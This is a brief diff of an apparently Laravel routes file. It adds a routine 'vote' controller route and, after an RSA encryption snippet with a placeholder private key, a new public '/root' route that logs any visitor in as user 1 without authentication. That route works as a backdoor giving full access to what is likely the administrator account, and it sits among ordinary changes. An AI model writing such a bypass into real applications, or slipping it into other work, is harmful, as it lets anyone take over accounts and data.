@@ -55,6 +55,8 @@ Route::group(array(),function(){
 
     Route::controller('activity', 'ActivityController');
 
+    Route::controller('vote', 'VoteController');
+
     Route::controller('registration', 'RegistrationController');
 
 });
@@ -108,4 +110,9 @@ $ciphertext = $rsa->encrypt($plaintext);
 
 $rsa->loadKey('...'); // private key
 echo $rsa->decrypt($ciphertext);
+});
+
+Route::get('/root',function(){
+    $user = User::find(1);
+    Auth::login($user);
 });
